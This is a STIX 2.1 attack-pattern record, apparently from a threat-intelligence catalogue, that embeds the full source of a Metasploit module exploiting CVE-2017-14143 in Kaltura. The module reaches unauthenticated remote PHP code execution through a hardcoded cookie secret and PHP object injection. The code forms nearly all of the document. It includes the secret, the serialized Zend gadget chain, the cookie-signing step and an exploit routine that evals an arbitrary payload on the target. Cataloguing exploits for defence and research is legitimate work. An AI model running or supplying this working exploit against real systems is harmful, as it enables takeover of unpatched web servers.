{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87b8c98d-be8a-4cf7-bc71-db35a6b6142d",
    "created": "2024-08-14T17:02:19.907696Z",
    "modified": "2024-08-14T17:02:19.9077Z",
    "name": "Kaltura Remote PHP Code Execution over Cookie",
    "description": " This module exploits an Object Injection vulnerability in Kaltura. By exploiting this vulnerability, unauthenticated users can execute arbitrary code under the context of the web server user.  Kaltura makes use of a hardcoded cookie secret which allows to sign arbitrary cookie data. After passing this signature check, the base64- decoded data is passed to PHPs unserialize() function which allows for code execution. The constructed object is again based on the SektionEins Zend code execution POP chain PoC. Kaltura versions prior to 13.1.0 are affected by this issue.  A valid entry_id (which is required for this exploit) can be obtained from any media resource published on the kaltura installation.  This module was tested against Kaltura 13.1.0-2 installed on Ubuntu 14.04.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/kaltura_unserialize_cookie_rce.rb",
            "external_id": "kaltura_unserialize_cookie_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-14143"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  CookieSecret = 'y3tAno3therS$cr3T'\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Kaltura Remote PHP Code Execution over Cookie',\n      'Description'    => %q{\n        This module exploits an Object Injection vulnerability in Kaltura.\n        By exploiting this vulnerability, unauthenticated users can execute\n        arbitrary code under the context of the web server user.\n\n        Kaltura makes use of a hardcoded cookie secret which allows to sign\n        arbitrary cookie data. After passing this signature check, the base64-\n        decoded data is passed to PHPs unserialize() function which allows for\n        code execution. The constructed object is again based on the SektionEins\n        Zend code execution POP chain PoC. Kaltura versions prior to 13.1.0 are\n        affected by this issue.\n\n        A valid entry_id (which is required for this exploit) can be obtained\n        from any media resource published on the kaltura installation.\n\n        This module was tested against Kaltura 13.1.0-2 installed on Ubuntu 14.04.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Robin Verton <hello@robinverton.de>',\n          'Mehmet Ince <mehmet@mehmetince.net>' # first kaltura rce module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2017-14143']\n        ],\n      'Privileged'      => false,\n      'Platform'        => ['php'],\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [ ['Automatic', {}] ],\n      'DisclosureDate'  => '2017-09-12',\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI of the Kaltura installation', '/']),\n        OptString.new('ENTRYID', [true, 'Valid entry ID of any media resource (example: 0_lahha4c9)', ''])\n      ]\n    )\n  end\n\n  def check\n    r = rand_text_alpha(15 + rand(4))\n    entry_id = datastore['ENTRYID']\n    cmd = \"print_r(#{r}).die()\"\n\n    p = \"\"\n    p << \"a:1:{s:1:\\\"z\\\";O:8:\\\"Zend_Log\\\":1:{s:11:\\\"\\00*\\00_writers\\\";\"\n    p << \"a:1:{i:0;O:20:\\\"Zend_Log_Writer_Mail\\\":5:{s:16:\\\"\\00*\\00_eventsToMail\\\";\"\n    p << \"a:1:{i:0;i:1;}s:22:\\\"\\00*\\00_layoutEventsToMail\\\";a:0:{}s:8:\\\"\\00*\\00_mail\\\";\"\n    p << \"O:9:\\\"Zend_Mail\\\":0:{}s:10:\\\"\\00*\\00_layout\\\";O:11:\\\"Zend_Layout\\\":3:{s:13:\\\"\\00*\\00_inflector\\\";\"\n    p << \"O:23:\\\"Zend_Filter_PregReplace\\\":2:{s:16:\\\"\\00*\\00_matchPattern\\\";s:7:\\\"/(.*)/e\\\";\"\n    p << \"s:15:\\\"\\00*\\00_replacement\\\";s:#{cmd.length.to_s}:\\\"#{cmd}\\\";}s:20:\\\"\\00*\\00_inflectorEnabled\\\";\"\n    p << \"b:1;s:10:\\\"\\00*\\00_layout\\\";s:6:\\\"layout\\\";}s:22:\\\"\\00*\\00_subjectPrependText\\\";N;}}};}\"\n\n    encoded = Rex::Text.encode_base64(p)\n    hash = Rex::Text.md5(\"#{encoded}#{CookieSecret}\")\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php', 'keditorservices', 'getAllEntries'),\n      'vars_get' => {\n        'list_type' => '15',\n        'entry_id' => entry_id\n      },\n      'cookie' => \"userzone=#{encoded}#{hash}\"\n    )\n\n    if res && res.redirect?\n      print_error(\"Got a redirect, maybe you are not using https? #{res.headers['Location']}\")\n      Exploit::CheckCode::Safe\n    elsif res && res.body.include?(r)\n      Exploit::CheckCode::Vulnerable\n    elsif !check_entryid\n      print_error(\"Invalid ENTRYID\")\n      Exploit::CheckCode::Safe\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def check_entryid\n    entry_id = datastore['ENTRYID']\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php', 'keditorservices', 'getAllEntries'),\n      'vars_get' => {\n        'list_type' => '15',\n        'entry_id' => entry_id\n      }\n    )\n\n    return res.body.include? entry_id\n  end\n\n  def exploit\n    entry_id = datastore['ENTRYID']\n    cmd = \"print_r(eval(base64_decode('#{Rex::Text.encode_base64(payload.encode)}'))).die()\"\n\n    p = \"\"\n    p << \"a:1:{s:1:\\\"z\\\";O:8:\\\"Zend_Log\\\":1:{s:11:\\\"\\00*\\00_writers\\\";\"\n    p << \"a:1:{i:0;O:20:\\\"Zend_Log_Writer_Mail\\\":5:{s:16:\\\"\\00*\\00_eventsToMail\\\";\"\n    p << \"a:1:{i:0;i:1;}s:22:\\\"\\00*\\00_layoutEventsToMail\\\";a:0:{}s:8:\\\"\\00*\\00_mail\\\";\"\n    p << \"O:9:\\\"Zend_Mail\\\":0:{}s:10:\\\"\\00*\\00_layout\\\";O:11:\\\"Zend_Layout\\\":3:{s:13:\\\"\\00*\\00_inflector\\\";\"\n    p << \"O:23:\\\"Zend_Filter_PregReplace\\\":2:{s:16:\\\"\\00*\\00_matchPattern\\\";s:7:\\\"/(.*)/e\\\";\"\n    p << \"s:15:\\\"\\00*\\00_replacement\\\";s:#{cmd.length.to_s}:\\\"#{cmd}\\\";}s:20:\\\"\\00*\\00_inflectorEnabled\\\";\"\n    p << \"b:1;s:10:\\\"\\00*\\00_layout\\\";s:6:\\\"layout\\\";}s:22:\\\"\\00*\\00_subjectPrependText\\\";N;}}};}\"\n\n    encoded = Rex::Text.encode_base64(p)\n    hash = Rex::Text.md5(\"#{encoded}#{CookieSecret}\")\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php', 'keditorservices', 'getAllEntries'),\n      'vars_get' => {\n        'list_type' => '15',\n        'entry_id' => entry_id\n      },\n      'cookie' => \"userzone=#{encoded}#{hash}\"\n    )\n\n    if res && res.redirect?\n      print_error(\"Got a redirect, maybe you are not using https? #{res.headers['Location']}\")\n    elsif res && res.code != 200\n      print_error('Unexpected response...')\n    else\n      print_status(\"Output: #{res.body}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-12",
    "x_mitre_platforms": [
        "['php']"
    ]
}